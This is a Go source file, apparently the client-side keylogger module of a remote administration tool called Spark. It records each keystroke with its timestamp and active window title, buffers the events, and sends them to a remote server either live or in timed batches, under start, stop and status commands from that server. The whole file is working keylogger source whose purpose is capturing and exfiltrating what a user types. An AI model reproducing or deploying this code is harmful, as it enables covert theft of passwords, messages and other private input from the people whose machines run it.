package keylogger

import (
	"Spark/client/common"
	"Spark/modules"
	"fmt"
	"sync"
	"time"

	"github.com/kataras/golog"
)

// KeyEvent represents a single keystroke event
type KeyEvent struct {
	Key       string    `json:"key"`
	Timestamp time.Time `json:"timestamp"`
	Window    string    `json:"window"`
	Type      string    `json:"type"` // "keydown", "keyup"
}

// KeyloggerConfig holds configuration for the keylogger
type KeyloggerConfig struct {
	Mode            string `json:"mode"`            // "live", "offline", "both"
	OfflineInterval int    `json:"offlineInterval"` // seconds between offline uploads
	MaxBuffer       int    `json:"maxBuffer"`       // max events to buffer before forced upload
}

// Keylogger manages keystroke capture and transmission
type Keylogger struct {
	config      KeyloggerConfig
	events      []KeyEvent
	eventsMutex sync.RWMutex
	isRunning   bool
	stopChan    chan bool
	conn        *common.Conn
}

// NewKeylogger creates a new keylogger instance
func NewKeylogger(conn *common.Conn) *Keylogger {
	return &Keylogger{
		config: KeyloggerConfig{
			Mode:            "offline",
			OfflineInterval: 60, // 1 minute default
			MaxBuffer:       1000,
		},
		events:   make([]KeyEvent, 0),
		stopChan: make(chan bool),
		conn:     conn,
	}
}

// Start begins keystroke capture
func (k *Keylogger) Start(config KeyloggerConfig) error {
	if k.isRunning {
		return nil
	}

	k.config = config
	k.isRunning = true

	// Start the platform-specific hook
	go k.startHook()

	// Start offline upload routine if needed
	if k.config.Mode == "offline" || k.config.Mode == "both" {
		go k.offlineUploadRoutine()
	}

	return nil
}

// Stop stops keystroke capture
func (k *Keylogger) Stop() {
	if !k.isRunning {
		return
	}

	k.isRunning = false
	k.stopChan <- true
	k.stopHook()

	// Upload any remaining events
	if len(k.events) > 0 {
		k.uploadEvents()
	}
}

// AddEvent adds a keystroke event
func (k *Keylogger) AddEvent(event KeyEvent) {
	k.eventsMutex.Lock()
	defer k.eventsMutex.Unlock()

	k.events = append(k.events, event)

	// Debug logging
	fmt.Printf("Event added: %s (mode: %s, total events: %d)\n", event.Key, k.config.Mode, len(k.events))

	// Send live if in live mode
	if k.config.Mode == "live" || k.config.Mode == "both" {
		fmt.Printf("Sending live event: %s\n", event.Key)
		k.sendLiveEvent(event)
	}

	// Check if we need to force upload due to buffer size
	if len(k.events) >= k.config.MaxBuffer {
		go k.uploadEvents()
	}
}

// sendLiveEvent sends a keystroke event immediately via WebSocket
func (k *Keylogger) sendLiveEvent(event KeyEvent) {
	packet := modules.Packet{
		Act: "keylogger_live",
		Data: map[string]any{
			"key":       event.Key,
			"timestamp": event.Timestamp,
			"window":    event.Window,
			"type":      event.Type,
		},
	}

	fmt.Printf("Sending packet to server: %+v\n", packet.Data)
	k.conn.SendPack(packet)
}

// uploadEvents uploads buffered events to server
func (k *Keylogger) uploadEvents() {
	k.eventsMutex.Lock()
	if len(k.events) == 0 {
		k.eventsMutex.Unlock()
		return
	}

	events := make([]KeyEvent, len(k.events))
	copy(events, k.events)
	k.events = k.events[:0] // Clear the buffer
	k.eventsMutex.Unlock()

	packet := modules.Packet{
		Act: "keylogger_upload",
		Data: map[string]any{
			"events": events,
		},
	}

	k.conn.SendPack(packet)
}

// offlineUploadRoutine periodically uploads events
func (k *Keylogger) offlineUploadRoutine() {
	ticker := time.NewTicker(time.Duration(k.config.OfflineInterval) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			k.uploadEvents()
		case <-k.stopChan:
			return
		}
	}
}

// GetActiveWindow returns the title of the currently active window
func (k *Keylogger) GetActiveWindow() string {
	return getActiveWindow()
}

// HandleAction processes keylogger-related commands from server
func HandleAction(conn *common.Conn, packet modules.Packet) {
	var keylogger *Keylogger
	if globalKeylogger == nil {
		globalKeylogger = NewKeylogger(conn)
	}
	keylogger = globalKeylogger

	switch packet.Act {
	case "keylogger_start":
		var config KeyloggerConfig
		// Extract config from packet.Data map
		if data := packet.Data; data != nil {
			if mode, ok := data["mode"].(string); ok {
				config.Mode = mode
			}
			if interval, ok := data["offlineInterval"].(float64); ok {
				config.OfflineInterval = int(interval)
			}
			if maxBuffer, ok := data["maxBuffer"].(float64); ok {
				config.MaxBuffer = int(maxBuffer)
			}
		}
		
		err := keylogger.Start(config)
		if err != nil {
			golog.Error("Keylogger: Failed to start: ", err)
			conn.SendPack(modules.Packet{
				Act: "keylogger_error",
				Data: map[string]any{
					"error": err.Error(),
				},
			})
			return
		}

		conn.SendPack(modules.Packet{
			Act: "keylogger_started",
			Data: map[string]any{
				"message": "Keylogger started successfully",
			},
		})

	case "keylogger_stop":
		keylogger.Stop()
		conn.SendPack(modules.Packet{
			Act: "keylogger_stopped",
			Data: map[string]any{
				"message": "Keylogger stopped successfully",
			},
		})

	case "keylogger_status":
		conn.SendPack(modules.Packet{
			Act: "keylogger_status",
			Data: map[string]any{
				"running": keylogger.isRunning,
				"config":  keylogger.config,
				"events":  len(keylogger.events),
			},
		})
	}
}

var globalKeylogger *Keylogger
